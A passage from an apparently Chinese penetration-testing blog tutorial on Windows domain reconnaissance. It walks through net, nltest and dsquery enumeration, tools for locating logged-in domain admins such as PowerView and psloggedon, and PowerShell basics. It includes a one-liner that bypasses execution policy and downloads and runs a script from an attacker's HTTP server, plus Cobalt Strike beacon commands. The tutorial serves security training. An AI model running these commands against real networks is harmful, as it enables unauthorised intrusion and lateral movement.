...]`列出要添加到本地组或从本地组中删除的一个或多个用户名或组名<br>∙`/add`将全局组名或用户名添加到本地组中<br>∙`/delete`从本地组中删除组名或用户名<br>例如：`Net localgroup ggg /add` 将名为ggg的本地组添加到本地用户帐号数据库；<br>`Net localgroup Administrator` 显示Administrator本地组中的用户。<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007101541784.png" alt="image-20231007101541784"></p><p><img src="/img/image-20231007101929047.png" alt="image-20231007101929047"></p><p>当域控想创建这台计算机的管理员用户时，只需要创建用户然后将其加入到domain admins组中即可 </p><h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><p>在 Windows NT&#x2F;2000&#x2F;2003 Server 域中添加、显示或更改全局组。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net group groupname &#123;/add [/comment:</span><span class="hljs-string">&quot;text &quot;</span>] | /delete&#125; [/domain]`<br>有关参数说明：<br>∙键入不带参数的Net group显示服务器名称及服务器的组名称<br>∙`groupname`要添加、扩展或删除的组<br><span class="hljs-title">∙`/comment:</span><span class="hljs-string">&quot;text &quot;</span>`为新建组或现有组添加注释<br>∙`/domain`在当前域的主域控制器中执行该操作，否则在本地计算机上执行操作<br>∙`username[ ...]`列表显示要添加到组或从组中删除的一个或多个用户<br>∙`/add`添加组或在组中添加用户名<br>∙`/delete`删除组或从组中删除用户名<br>例如：`Net group ggg GHQ1 GHQ2 /add`将现有用户帐号GHQ1和GHQ2添加到本地计算机的ggg组<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007102532660.png" alt="image-20231007102532660"></p><h4 id="net-file"><a href="#net-file" class="headerlink" title="net file"></a>net file</h4><p>显示某服务器上所有打开的共享文件名及锁定文件数。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">命令格式：`<span class="hljs-keyword">Net</span> <span class="hljs-keyword">file</span> [id [/<span class="hljs-keyword">close</span>]]`<br>有关参数说明：<br>∙键入不带参数的<span class="hljs-keyword">Net</span> <span class="hljs-keyword">file</span>获得服务器上打开文件的列表<br>∙`id`文件标识号<br>∙/<span class="hljs-keyword">close</span>关闭打开的文件并释放锁定记录<br></code></pre></td></tr></table></figure><h4 id="net-config"><a href="#net-config" class="headerlink" title="net config"></a>net config</h4><p>显示当前运行的可配置服务，或显示并更改某项服务的设置。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net config [service [options]]`<br>有关参数说明：<br>∙键入不带参数的Net config显示可配置服务的列表<br>∙`service`通过Net config命令进行配置的服务(server或workstation)<br>`options`服务的特定选项<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007104619600.png" alt="image-20231007104619600"></p><h4 id="net-computer"><a href="#net-computer" class="headerlink" title="net computer"></a>net computer</h4><p>从域数据库中添加或删除计算机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令格式：Net computer \computername &#123;/add | /del&#125;<br>有关参数说明：<br>∙\\computername指定要添加到域或从域中删除的计算机<br>∙/add将指定计算机添加到域<br>∙/del将指定计算机从域中删除<br>例如：Net computer \\js /add将计算机js 添加到登录域。<br></code></pre></td></tr></table></figure><h3 id="②查询域"><a href="#②查询域" class="headerlink" title="②查询域"></a>②查询域</h3><p>查询域的命令如下 </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p>如果出现”此工作组的服务器列表当前无法使用” 开启服务：Server ，WorkStation，computer Browser,关闭防火墙</p><p><img src="/img/image-20231007104912481.png" alt="image-20231007104912481"></p><h3 id="③查询域内所有计算机"><a href="#③查询域内所有计算机" class="headerlink" title="③查询域内所有计算机"></a>③查询域内所有计算机</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span>/<span class="hljs-built_in">domain</span>:域名<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007105005557.png" alt="image-20231007105005557"></p><h3 id="④查询域内所有用户组列表"><a href="#④查询域内所有用户组列表" class="headerlink" title="④查询域内所有用户组列表"></a>④查询域内所有用户组列表</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">/domain</span>注意：只有域用户才能查询<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007105243145.png" alt="image-20231007105243145"></p><p>系统自带的常见用户身份如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Domain</span> Admins:域管理员。<br><span class="hljs-keyword">Domain</span> Computers:域内机器。<br><span class="hljs-keyword">Domain</span> Controllers:域控制器。<br><span class="hljs-keyword">Domain</span> Gusers:域访客,权限较低。<br><span class="hljs-keyword">Domain</span> <span class="hljs-keyword">User</span>:域用户。<br>Enterprise Admins:企业系统管理员用户<br>在默认情况下, <span class="hljs-keyword">Domain</span> admins和Enterprise Admins对域内所有域控制器有完全控制权限<br></code></pre></td></tr></table></figure><h3 id="⑤查询所有域成员计算机列表"><a href="#⑤查询所有域成员计算机列表" class="headerlink" title="⑤查询所有域成员计算机列表"></a>⑤查询所有域成员计算机列表</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007105719426.png" alt="image-20231007105719426"></p><h3 id="⑥获取域密码信息"><a href="#⑥获取域密码信息" class="headerlink" title="⑥获取域密码信息"></a>⑥获取域密码信息</h3><p>执行如下命令’获取域密码策略、密码长度、错误锁定等信息</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net accounts /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007105946134.png" alt="image-20231007105946134"></p><h3 id="⑦获取域信任信息"><a href="#⑦获取域信任信息" class="headerlink" title="⑦获取域信任信息"></a>⑦获取域信任信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nltest /domain_trusts<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007110006792.png" alt="image-20231007110006792"></p><h2 id="2-域环境中查找DC的多种方式"><a href="#2-域环境中查找DC的多种方式" class="headerlink" title="2.域环境中查找DC的多种方式"></a>2.域环境中查找DC的多种方式</h2><h3 id="查看域控制器的机器名"><a href="#查看域控制器的机器名" class="headerlink" title="查看域控制器的机器名"></a>查看域控制器的机器名</h3><p>执行如下命令,可以看到,域控制器的机器名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nltest /DCLIST:hack<br>获取域控的ip：<br>ping DC<span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.com</span><br>nslookup DC<span class="hljs-selector-class">.hack</span>.com<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007111132686.png" alt="image-20231007111132686"></p><p><img src="/img/image-20231007111253023.png" alt="image-20231007111253023"></p><h3 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h3><p>执行如下命令,可以看到,域控制器的主机名</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">nslookup -<span class="hljs-built_in">type</span>=SRV <span class="hljs-variable">_ldap</span>.<span class="hljs-variable">_tcp</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007111503042.png" alt="image-20231007111503042"></p><h3 id="查看当前时间"><a href="#查看当前时间" class="headerlink" title="查看当前时间"></a>查看当前时间</h3><p>在通常情况下,<strong>时间服务器为主域控制器</strong>。执行如下命令</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007111614338.png" alt="image-20231007111614338"></p><h3 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h3><p>执行如下命令,查看域控制器组。,其中有一台机器名为”DC”的域控制器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Domain</span> Controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007111644401.png" alt="image-20231007111644401"></p><p>在实际网络中,一个域内一般存在两台或两台以上的域控制器,其目的是:一旦主域控制器发生故障,备用的域控制器可以保证域内的服务和验证工作正常进行</p><h2 id="3-域环境中查找域内用户信息"><a href="#3-域环境中查找域内用户信息" class="headerlink" title="3.域环境中查找域内用户信息"></a>3.域环境中查找域内用户信息</h2><h3 id="向域控制器进行查询"><a href="#向域控制器进行查询" class="headerlink" title="向域控制器进行查询"></a>向域控制器进行查询</h3><p>执行如下命令,向域控制器DC进行查询,,域内有多个用户。其中,krbtgt 用户不仅可以创建票据授权服务(TGS)的加密 密钥,还可以实现多种域内权限持久化方法</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007145023930.png" alt="image-20231007145023930"></p><h3 id="获取域内用户详细信息"><a href="#获取域内用户详细信息" class="headerlink" title="获取域内用户详细信息"></a>获取域内用户详细信息</h3><p>wmic可以获取域内用户的详细常见参数包括用户名、描述信息、SID、域名、状态等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /?  查看帮助<br>wmic useraccount <span class="hljs-keyword">get</span> <span class="hljs-type">name</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007150154499.png" alt="image-20231007150154499"></p><p><img src="/img/image-20231007150231829.png" alt="image-20231007150231829"></p><h3 id="查看存在的用户"><a href="#查看存在的用户" class="headerlink" title="查看存在的用户"></a>查看存在的用户</h3><p>执行如下命令,可以看到,域内用户（server机器有这个命令）</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p>常用的 dsquery命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">dsquery computer ‐查找目录中的计算<br>dsquery contact ‐查找目录中的职系人<br>dsquery subnet ‐目录中的子网<br>dsquery <span class="hljs-keyword">group</span> <span class="hljs-title">‐查找目录中的组,</span><br><span class="hljs-title">dsquery</span> ou ‐查找目录中的组织单位,<br>dsquery site ‐最找目景中的站成<br>dsquery server ‐查找目录中的ADDC/LDs实例<br>asquery <span class="hljs-keyword">user</span> <span class="hljs-title">‐查找目录中的用户</span><br><span class="hljs-title">dsquery</span> quota ‐查找目录中的配颗机定<br>dsquery partition ‐查找目录中的分区<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007151306581.png" alt="image-20231007151306581"></p><p><img src="/img/image-20231007151443777.png" alt="image-20231007151443777"></p><h3 id="查询域管理用户"><a href="#查询域管理用户" class="headerlink" title="查询域管理用户"></a>查询域管理用户</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure><p>Domain admin组中的用户默认为域内机器的本地管理员用户 在实际应用中’为了方便管理 会有域用户被设置为域 机器的本地管理员用户</p><p><img src="/img/image-20231007151614534.png" alt="image-20231007151614534"></p><h3 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Enterprise</span> Admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007151705203.png" alt="image-20231007151705203"></p><h2 id="4-定位域管理员"><a href="#4-定位域管理员" class="headerlink" title="4.定位域管理员"></a>4.定位域管理员</h2><p>在内网中，通常会部署大址的网络安全系统和设备,例如IDS、IPS、日志审计、安全网关、 反病毒软件等。在域网 络攻击测试中,获取域内的一个支点后，需要获取域管理员权限. 在一个域中，当计算机加入域后，会默认给域管理 员组赋予本地系统管理员权限,也就是说, <strong>当主机被添加到域中.成为域的成员主机后，系统会自动将域管理员组添加到该计算机的本地系统管理员组中，因此域管理员组的成员都可以访问本地计算机，且具备安全控制权限</strong> </p><p>定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，会话是指域内每台机器的登 录会话 </p><p>假设已经在Windows域中取得了普通用户权限，希望在域内横向移动，需要知道域内用户登录的位置、他是否是 任何系统的本地管理员、他所属的组、他是否有权访问文件共享等。枚举主机、用户和组，有助于更好地了解域的 布局。</p><h3 id="手动定位域管理员"><a href="#手动定位域管理员" class="headerlink" title="手动定位域管理员"></a>手动定位域管理员</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span> 查看当前域名<br>net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>:域名 查看域内部所有计算机名<br>net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> 查看域内部所有用户组列表<br>net <span class="hljs-keyword">group</span> &quot;domain computers&quot; /<span class="hljs-keyword">domain</span> 查看所有域成员计算机列表<br>net accounts /<span class="hljs-keyword">domain</span> 查看域密码信息<br>nltest /domian_trusts 获取域信任信息<br>nltest /DCLIST:域名 查看域控制器机器名<br>net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span> 查看当前时间，因为时间服务器也是主域服务器，可以看到域服务器的机器名<br>net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span> 查看域控制器组，因为可能有不止一台域控，有主备之分<br>net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> 查询域内用户，会看到熟悉的krbtgt用户<br>wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">all</span> 获取域内用户详细信息<br>dsquery <span class="hljs-keyword">user</span> 查看域内存在的用户<br>net localgroup administrators 查看本地管理员用户组<br>net <span class="hljs-keyword">group</span> &quot;domain admins&quot; /<span class="hljs-keyword">domain</span> 查询域管理员用户<br></code></pre></td></tr></table></figure><h3 id="psloggedon-exe工具"><a href="#psloggedon-exe工具" class="headerlink" title="psloggedon.exe工具"></a>psloggedon.exe工具</h3><p>psloggedon.exe 可以<strong>显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户</strong>。如果指定了用户名 而不是计算机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前是否已登录。</p><p>首次使用：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psloggedon<span class="hljs-selector-class">.exe</span> /accepteula<br>psloggedon<span class="hljs-selector-class">.exe</span> \\PC-<span class="hljs-number">2003</span><br>psloggedon<span class="hljs-selector-class">.exe</span> jack<br></code></pre></td></tr></table></figure><img src="/img/image-20231007155245879.png" alt="image-20231007155245879" style="zoom:80%;" /><h3 id="PVEDFindADUser-exe工具"><a href="#PVEDFindADUser-exe工具" class="headerlink" title="PVEDFindADUser.exe工具"></a>PVEDFindADUser.exe工具</h3><p>pveFindADUser.exe 可用于<strong>查找 Active Directory 用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户</strong>，包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户账户。运行该工具的计算机需要 具有.NETFramework 2.0，并且需要具有管理员权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">‐h：显示帮助信息<br>‐<span class="hljs-keyword">current</span>[&quot;username&quot;]：如果仅指定‐<span class="hljs-keyword">current</span>参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名<br>（Domain\Username），则显示该用户登录的计算机<br>‐<span class="hljs-keyword">last</span>[&quot;username&quot;]：如果仅指定‐<span class="hljs-keyword">last</span>参数，将获取目标计算机上最后一个登录用户。如果指定了用户名<br>（Domain\Username），则显示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户<br>名，此时使用该工具可能无法得到用户名<br>‐noping：阻止该工具在获取用户登陆信息之前对目标执行ping命令<br>‐target：可选参数，用于指定要查询的主机。如果未指定该参数，将查询域中的所有主机。如果指定了此参数，主机名<br>列表由逗号分隔<br>直接运行&quot;pvefindaduser.exe ‐current&quot;，即可显示域中所有计算机上当前登录的用户<br>PVEFindADUser.exe <span class="hljs-operator">-</span><span class="hljs-keyword">current</span> hack\jack  查看该用户在哪台计算机上登录<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007160021667.png" alt="image-20231007160021667"></p><h3 id="netview-exe工具"><a href="#netview-exe工具" class="headerlink" title="netview.exe工具"></a>netview.exe工具</h3><p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用NetSessionEnum找寻登陆会话，利NetShareEnum 找寻共享，利用NetWkstaUserEnum<strong>枚举登陆的用户</strong>。同时，netview.exe 能够查询共享入口和有价值的用户。 netview.exe的绝大部分功能不需要管理员权限就可以使用。</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sas">使用语法：<br>netview.exe &lt;参数&gt;<br>‐h：显示帮助菜单。<br>‐f <span class="hljs-keyword">filename</span>.txt：指定从中提取主机列表的文件。<br>‐e <span class="hljs-keyword">filename</span>.txt：指定要排除的主机名文件。<br>‐o <span class="hljs-keyword">filename</span>.txt：将所有输出重定向到文件。<br>‐d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。<br>‐g <span class="hljs-keyword">group</span>：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。<br>‐c：检查对已找到共享的访问权限<br><br>netview.exe -d hack<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007160853211.png" alt="image-20231007160853211"></p><h3 id="NSE脚本"><a href="#NSE脚本" class="headerlink" title="NSE脚本"></a>NSE脚本</h3><p>如果存在域账户或者本地账户就可以使用Nmap的smb-enum-sessions.nes引擎获取远程机器的登录会话（不需要管理员权限）。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">smb‐<span class="hljs-keyword">enum</span>‐domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等<br>smb‐<span class="hljs-keyword">enum</span>‐users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这<br>个脚本对域控制器进行扫描<br>smb‐<span class="hljs-keyword">enum</span>‐shares：遍历远程主机的共享目录<br>smb‐<span class="hljs-keyword">enum</span>‐processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。<br>smb‐<span class="hljs-keyword">enum</span>‐sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。<br>smb‐os‐discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、<br></code></pre></td></tr></table></figure><h3 id="PowerView脚本"><a href="#PowerView脚本" class="headerlink" title="PowerView脚本"></a>PowerView脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、 Invoke-UserHunter 等，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;&amp; &#123; import-module .\PowerView.ps1;Invoke-UserHunter&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007161535330.png" alt="image-20231007161535330"></p><h2 id="5-powershell基础"><a href="#5-powershell基础" class="headerlink" title="5.powershell基础"></a>5.powershell基础</h2><p>Powershell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。可以把它看成是命令行提示符cmd.exe的扩充，不对，应当是颠覆。 powershell需要.NET环境的支持，同时支持.NET对象。微软之所以将Powershell 定位为Power，并不是夸大其词，因为它完全支持对象。其可读性，易用性，可以位居当前所有shell之首。 </p><p>当前powershell有四版本，分别为1.0， 2.0，3.0 ,4.0 如果您的系统是window7或者Windows Server 2008，那么PowerShell 2.0已经内置了，可以升级 为3.0，4.0。</p><p>如果您的系统是Windows 8 或者Windows server 2012，那么PowerShell 3.0已经内置了，可以升级为4.0。</p><p>如果您的系统为Windows 8.1或者Windows server 2012 R2，那默认已经是4.0了。</p><h3 id="管道和重定向"><a href="#管道和重定向" class="headerlink" title="管道和重定向"></a>管道和重定向</h3><p>例如通过ls获取当前目录的所有文件信息，然后通过Sort -Descending对文件信息按照Name降序排 列，最后将排序好的文件的Name和Mode格式化成Table输出</p><img src="/img/image-20231007165949569.png" alt="image-20231007165949569" style="zoom:80%;" /><p>把命令的输出保存到文件中，‘&gt;’为覆盖，’&gt;&gt;’追加</p><p><img src="/img/image-20231007170138792.png" alt="image-20231007170138792"></p><h3 id="执行外部命令"><a href="#执行外部命令" class="headerlink" title="执行外部命令"></a>执行外部命令</h3><p>Powershell 能够像CMD一样很好的执行外部命令 </p><p>通过IPConfig查看自己的网络配置</p><p>通过netstat查看网络端口状态</p><p>启动CMD控制台</p><p>Cmd.exe 通过 &#x2F;c 来接收命令参数，在Cmd中help可以查看可用的命令，所以可以通过Cmd &#x2F;c  help 查找可用的Cmd控制台命令</p><h3 id="指定内部命令"><a href="#指定内部命令" class="headerlink" title="指定内部命令"></a>指定内部命令</h3><p>官方文档：<a href="https://learn.microsoft.com/zh-cn/powershell/?view=powershell-5.1">https://learn.microsoft.com/zh-cn/powershell/?view=powershell-5.1</a></p><p>每个命令有一个动词和名词组成，命令的作用一目了然</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-<span class="hljs-keyword">Alias</span>  获取命令的别名<br></code></pre></td></tr></table></figure><img src="/img/image-20231007172220116.png" alt="image-20231007172220116" style="zoom:80%;" /><h3 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h3><p>Powershell一般初始化情况下都会禁止脚本执行。脚本能否执行取决于Powershell的执行策略</p><p>powershell脚本以ps1结尾</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ExecutionPolicy</span> 查看权限<br><span class="hljs-variable">Unrestricted</span><span class="hljs-operator">:</span>权限最高，可以不受限制执行任何脚本。<br><span class="hljs-built_in">Default</span><span class="hljs-operator">:</span>为<span class="hljs-variable">Powershell</span>默认的策略：<span class="hljs-built_in">Restricted</span>，不允许任何脚本执行。<br><span class="hljs-variable">AllSigned</span>：所有脚本都必须经过签名才能在运行。<br><span class="hljs-variable">RemoteSigned</span>：本地脚本无限制，但是对来自网络的脚本必须经过签名<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007173051343.png" alt="image-20231007173051343"></p><p>改变运行策略</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">Unrestricted</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231007173158318.png" alt="image-20231007173158318" style="zoom: 80%;" /><p>脚本测试：</p><img src="/img/image-20231007173427268.png" alt="image-20231007173427268" style="zoom:80%;" /><h2 id="6-使用powershell收集域内信息"><a href="#6-使用powershell收集域内信息" class="headerlink" title="6.使用powershell收集域内信息"></a>6.使用powershell收集域内信息</h2><h3 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h3><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。 </p><p>Powershell的优点: </p><p>1.代码运行在内存中可以不去接触磁盘 </p><p>2.从另一个系统中下载代码并执行 </p><p>3.很多安全产品并不能监测到powershell的活动 </p><p>4.cmd.exe通常被阻止运行，但是powershell不会</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">AntivirusBypass：发现杀毒软件的查杀特征。<br>CodeExecution：在目标主机上执行代码。<br>Exfiltration：目标主机上的信息搜集工具。<br>Mayhem：蓝屏等破坏性脚本。<br>Persistence：后面脚本(持久性控制)。<br>Recon：以目标主机为跳板进行内网信息侦察。<br>ScriptModification：在目标主机上创建或修改脚本。<br></code></pre></td></tr></table></figure><p>powerview也是一款非常的powershell脚本工具，用于域内信息的收集。他集成在在 PowerSploit-master\Recon目录下。   <strong>PowerView.ps1</strong></p><p>使用方式三种方式</p><p>1.靶机本地执行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> powershell.exe -<span class="hljs-built_in">exec</span> bypass -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;&amp; &#123; import-module C:\Users\Administrator\Desktop\PowerView.ps1;Get-NetUser&#125;&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231008102536240.png" alt="image-20231008102536240"></p><p>2.远程执行</p><p>python 开启http 服务 python -m http.server 8080</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">shell powershell -exec bypass -c IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://ip:8080/PowerView.ps1&#x27;</span>);<span class="hljs-keyword">import</span>-module .\PowerView.ps1;<span class="hljs-keyword">Get</span>-NetShare<br></code></pre></td></tr></table></figure><p>3.CS自带命令 攻击机执行</p><p>在cs的文件夹中存储ps1文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">beacon&gt; powershell-import <span class="hljs-regexp">//</span>导入各种powershell脚本<br>beacon&gt; powershell 